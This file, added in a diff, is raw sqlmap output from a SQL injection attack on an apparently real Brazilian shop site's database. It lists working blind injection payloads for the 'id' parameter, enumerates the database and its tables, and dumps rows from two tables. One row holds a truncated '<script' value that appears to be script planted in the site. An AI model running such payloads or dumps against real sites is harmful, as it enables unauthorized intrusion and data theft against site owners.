@@ -1,0 +1,90 @@
+sqlmap identified the following injection point(s) with a total of 316 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 9158=9158
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.6.38, Apache 2.2
+back-end DBMS: MySQL >= 5.0.12
+available databases [2]:
+[*] information_schema
+[*] zorh_com_br
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 9158=9158
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.6.38, Apache 2.2
+back-end DBMS: MySQL >= 5.0.12
+Database: zorh_com_br
+[4 tables]
++------------+
+| banners    |
+| categorias |
+| produtos   |
+| quem_somos |
++------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 9158=9158
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.6.38, Apache 2.2
+back-end DBMS: MySQL >= 5.0.12
+Database: zorh_com_br
+[4 tables]
++------------+
+| banners    |
+| categorias |
+| produtos   |
+| quem_somos |
++------------+
+
+Database: zorh_com_br
+Table: banners
+[2 entries]
++----+----------+-------+---------+
+| id | Nome     | Ordem | Liberar |
++----+----------+-------+---------+
+| 1  | Banner 1 | 1     | 1       |
+| 2  | Banner 1 | 2     | 1       |
++----+----------+-------+---------+
+
+Database: zorh_com_br
+Table: categorias
+[5 entries]
++----+--------------------------------+-------+
+| id | nome                           | ordem |
++----+--------------------------------+-------+
+| 1  | DVD PLAYERS                    | 1     |
+| 2  | RADIOS                         | 3     |
+| 3  | RADIO RELÓGIO                  | 4     |
+| 4  | CD PLAYERS                     | 2     |
+| 8  | <script type="text/javascript" | 0     |
++----+--------------------------------+-------+
+
